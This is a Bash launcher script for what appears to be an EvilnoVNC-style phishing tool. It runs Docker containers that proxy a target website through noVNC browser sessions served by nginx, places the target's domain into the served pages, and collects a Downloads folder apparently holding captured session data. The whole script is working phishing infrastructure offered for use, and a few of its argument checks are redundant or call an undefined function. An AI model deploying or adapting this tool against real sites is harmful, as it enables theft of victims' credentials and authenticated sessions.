#!/bin/bash


trap cleanup SIGINT

cleanup() {
    printf "\n\e[1;33mListing active containers...\e[1;0m\n"
    sudo docker ps -a --filter ancestor=evilnovnc

    printf "\n\e[1;33mDo you want to stop and remove all containers? (y/n):\e[1;0m "
    read -r response
    if [[ "$response" == "y" ]]; then
        printf "\n\e[1;33mStopping and removing containers...\e[1;0m\n"
        sudo docker stop $(sudo docker ps -a -q --filter ancestor=evilnovnc)
        sudo docker rm $(sudo docker ps -a -q --filter ancestor=evilnovnc)
    fi

    printf "\n\e[1;33m[>] Wait a moment..." ; sleep 3
    sudo docker stop evilnginx > /dev/null 2>&1 &
    sudo docker network rm nginx-evil > /dev/null 2>&1 &
    printf "\n\e[1;32m[+] Done!\n\e[1;0m"
    exit 0
}

function banner {
    printf "\e[1;34m                                                     
   
    __  ___        __ __   _                             
   /  |/  /__  __ / // /_ (_)                            
  / /|_/ // / / // // __// /                             
 / /  / // /_/ // // /_ / /                              
/_/  /_/ \__,_//_/ \__//_/                                                                    
    ______        _  __             _    __ _   __ ______
   / ____/_   __ (_)/ /____   ____ | |  / // | / // ____/
  / __/  | | / // // // __ \ / __ \| | / //  |/ // /     
 / /___  | |/ // // // / / // /_/ /| |/ // /|  // /___   
/_____/  |___//_//_//_/ /_/ \____/ |___//_/ |_/ \____/  
                                                                                                                                                                                                                                                                                                                    
\e[1;32m  ---------------- Wanetty inspired by @JoelGMSec ------v.1.1.0--------\n\e[1;0m
    
    Now you can access the root of your domain.\n\n

    \n\e[1;33mContainers running\e[1;34m: 
    ";
}

if [ $# -lt 1 ]; then
    echo "Usage: $0 <URL> [--no-ddos-protection]"
    exit 1
fi

if [[ $# -lt 1 ]] ; then help
if [[ $# -lt 0 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
WEBPAGE=$1
DDOS_PROTECTION_ENABLED=1

# Process additional arguments
shift
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --no-ddos-protection) DDOS_PROTECTION_ENABLED=0 ;;
        *) echo "Unknown argument: $1" ; exit 1 ;;
    esac
    shift
done


path=$(pwd)
printf "\n\e[1;33m[>]Preparando nginx...\n"
cd Files
cp index.html index_tmp.html
cp index.js index_tmp.js
id_image=$(sudo docker images evilnovnc -q)
if [ -z $id_image ]; then
    printf "\e[1;31m[!] Image 'evilnovnc' not found!\n\n"
    exit 1
fi

#Change this if you have another index.html
domain=$(echo "$WEBPAGE" | awk -F/ '{print $3}')
sed -i'' -e "s,_domain_,$domain,g" index_tmp.html
sed -i'' -e "s,_domain_,$domain,g" index_tmp.js
cd ..
sudo docker network create nginx-evil 2> /dev/null
if [ $DDOS_PROTECTION_ENABLED -eq 1 ]; then
    echo "DDoS protection is enabled."
    ram=$(free -m | grep Mem | awk '{print $2}')
    echo "Max Ram detected: $ram"
    sudo docker run --name evilnginx --rm -e MAX_RAM=$ram -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:80 -d evilnginx
else
    echo "DDoS protection is disabled."
    sudo docker run --name evilnginx --rm -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:80 -d evilnginx
fi
sudo docker exec -it evilnginx bash -c "cp /data/default.conf /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "nginx -s reload"

sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.html /usr/share/nginx/html/index.html"
sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.js /usr/share/nginx/html/index.js"
sudo docker exec -it evilnginx bash -c "nohup /bin/bash -c '/root/server $path $WEBPAGE &'"
rm ./Files/index_tmp.html ./Files/index_tmp.js
printf "\n\e[1;33m[>]Fin nginx..."

while true ; 
do 
    clear; 
    banner;
    if [ $DDOS_PROTECTION_ENABLED -eq 1 ]; then
        #The maximum number of containers is calculated based on the available RAM -> The final number is calculated in the file server.go
        echo "Maximum containers for maximum performance: $((($ram - 100) / 600))" 
    fi
    instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); 
    for ins in $(echo $instances); do 
        echo "http://localhost/$ins"; 
    done;
    sudo chown -R 103 Downloads > /dev/null 
    sleep 15; 
done